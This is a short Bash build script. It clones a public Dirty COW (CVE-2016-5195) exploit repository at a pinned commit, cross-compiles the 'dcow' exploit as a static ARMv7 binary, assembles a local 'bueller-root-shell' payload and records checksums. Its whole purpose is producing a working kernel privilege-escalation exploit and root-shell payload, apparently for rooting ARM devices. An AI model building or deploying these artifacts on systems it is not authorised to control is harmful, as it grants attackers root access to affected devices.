#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/lib.sh"

DIRTYCOW_URL='https://github.com/timwr/CVE-2016-5195.git'
DIRTYCOW_COMMIT='f5671399e040a168307058c598d62de64bb441d8'
SRC_DIR="$REPO_ROOT/.build/CVE-2016-5195"
ARTIFACT_DIR="$REPO_ROOT/artifacts"

require_cmd git
require_cmd arm-linux-gnueabihf-gcc
mkdir -p "$REPO_ROOT/.build" "$ARTIFACT_DIR"

if [[ ! -d "$SRC_DIR/.git" ]]; then
    git clone "$DIRTYCOW_URL" "$SRC_DIR"
fi
git -C "$SRC_DIR" fetch --depth 1 origin "$DIRTYCOW_COMMIT"
git -C "$SRC_DIR" checkout --detach "$DIRTYCOW_COMMIT"
[[ "$(git -C "$SRC_DIR" rev-parse HEAD)" == "$DIRTYCOW_COMMIT" ]] || die 'Dirty COW commit mismatch'

arm-linux-gnueabihf-gcc -march=armv7-a -O2 -static -pthread \
    -Wl,--build-id=none -o "$ARTIFACT_DIR/dcow" \
    "$SRC_DIR/dcow.c" "$SRC_DIR/dirtycow.c"
arm-linux-gnueabihf-gcc -march=armv7-a -nostdlib -static -no-pie \
    -Wl,--build-id=none -Wl,-e,_start \
    -o "$ARTIFACT_DIR/bueller-root-shell" \
    "$REPO_ROOT/payload/bueller-root-shell.S"
chmod 0755 "$ARTIFACT_DIR/dcow" "$ARTIFACT_DIR/bueller-root-shell"
(
    cd "$ARTIFACT_DIR"
    sha256sum dcow bueller-root-shell > SHA256SUMS
)
printf 'Built artifacts in %s\n' "$ARTIFACT_DIR"

